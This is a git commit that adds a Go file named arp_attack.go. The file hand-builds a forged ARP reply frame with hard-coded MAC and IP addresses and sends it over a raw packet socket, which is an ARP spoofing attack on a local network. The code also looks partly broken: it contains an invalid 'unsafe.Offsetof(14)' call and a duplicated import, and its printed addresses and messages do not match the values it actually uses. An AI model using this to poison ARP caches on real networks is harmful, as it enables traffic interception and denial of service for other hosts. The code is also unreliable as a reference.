38f002b454ad395d43f8e77180b74a2d25971948
马里 <mali.1101@bytedance.com>
2021-06-23 17:06:25 +0800

    提交go代码相关。。。

---
+++ doc/go实现arp/arp_attack.go
@@ -0,0 +1,96 @@
+package attack
+
+import "C"
+import (
+	"encoding/binary"
+	"fmt"
+	"net"
+	"syscall"
+	"unsafe"
+)
+
+//https://gist.github.com/PollenPolle/ada4d123a4579f3e22f2c5e30e6f4a02
+//https://github.com/chamaken/cgolmnl/blob/master/inet/inet.go
+
+import "C"
+
+type Ethhdr struct {
+	Dest   [6]uint8
+	Source [6]uint8
+	proto  uint16
+}
+
+type ArpPacket struct {
+	//28字节arp请求 应答
+	HwType       uint16   //硬件类型
+	ProtType     uint16   //协议类型
+	HwAddrSize   uint8    //硬件地址长度
+	ProtAddrSize uint8    //协议地址长度
+	Op           uint16   //操作类型
+	SndrHwAddr   [6]uint8 //发送端源mac地址
+	SndrIpAddr   [4]uint8 //发送端源ip地址
+	RcptHwAddr   [6]uint8 //目的mac地址
+	RcptIpAddr   [4]uint8 //目的ip地址
+	Padding      [18]uint8
+}
+
+func htons(i uint16) uint16 {
+	b := make([]byte, 2)
+	binary.BigEndian.PutUint16(b, i)
+	return *(*uint16)(unsafe.Pointer(&b[0]))
+}
+
+func createArpPacket() [60]uint8 {
+	data := [60]uint8{}
+	dataPointer := unsafe.Pointer(&data)
+
+	ethhdr := (*Ethhdr)(dataPointer)
+	ethhdr.Dest = [6]uint8{0x00, 0x15, 0x5d, 0x13, 0x9a, 0x04}   //目标mac地址
+	ethhdr.Source = [6]uint8{0x00, 0x15, 0x5d, 0x13, 0x9a, 0x04} //源mac地址
+	ethhdr.proto = htons(0x0806)
+
+	arpPacket := (*ArpPacket)(unsafe.Pointer(uintptr(dataPointer) + unsafe.Offsetof(14)))
+	arpPacket.HwType = htons(0x0001)                                    //硬件类型
+	arpPacket.ProtType = htons(0x0800)                                  //协议类型
+	arpPacket.HwAddrSize = 6                                            //硬件地址长度
+	arpPacket.ProtAddrSize = 4                                          //协议地址长度
+	arpPacket.Op = htons(0x0002)                                        //操作类型    OP_ARP_QUEST 1  OP_ARP_REQUEST 2
+	arpPacket.SndrHwAddr = [6]uint8{0x00, 0x15, 0x5d, 0x13, 0x9a, 0x04} //发送端源mac地址
+	arpPacket.SndrIpAddr = [4]uint8{0x0a, 0x4f, 0x13, 0x01}             //发送端源ip地址
+	arpPacket.RcptHwAddr = [6]uint8{0x00, 0x15, 0x5d, 0x13, 0x9a, 0x04} //映射mac地址
+	arpPacket.RcptIpAddr = [4]uint8{0x0a, 0x4f, 0x13, 0x01}             //映射ip地址
+	arpPacket.Padding = [18]uint8{0x00, 0x15, 0x5d, 0x13, 0x9a, 0x04}
+	return data
+}
+
+func ArpAttack() {
+	interf, err := net.InterfaceByName("ens33")
+	if err != nil {
+		fmt.Println("Could not find vboxnet interface")
+		return
+	}
+	fmt.Println("Interface hw address: ", interf.HardwareAddr)
+	fmt.Println("Creating request for IP 10.10.10.2 from IP 10.10.10.1")
+
+	var addr syscall.SockaddrLinklayer
+	addr.Protocol = syscall.ETH_P_ARP
+	addr.Ifindex = interf.Index
+	addr.Hatype = syscall.ARPHRD_ETHER
+
+	fd, err := syscall.Socket(syscall.AF_PACKET, syscall.SOCK_RAW, syscall.ETH_P_ALL)
+	if err != nil {
+		fmt.Println("Error: " + err.Error())
+		return
+	}
+	defer syscall.Close(fd)
+
+	arpPacket := createArpPacket()
+
+	packet := C.GoBytes(unsafe.Pointer(&arpPacket), C.int(60))
+	err = syscall.Sendto(fd, packet, 0, &addr)
+	if err != nil {
+		fmt.Println("Error: ", err)
+	} else {
+		fmt.Println("Sent packet")
+	}
+}
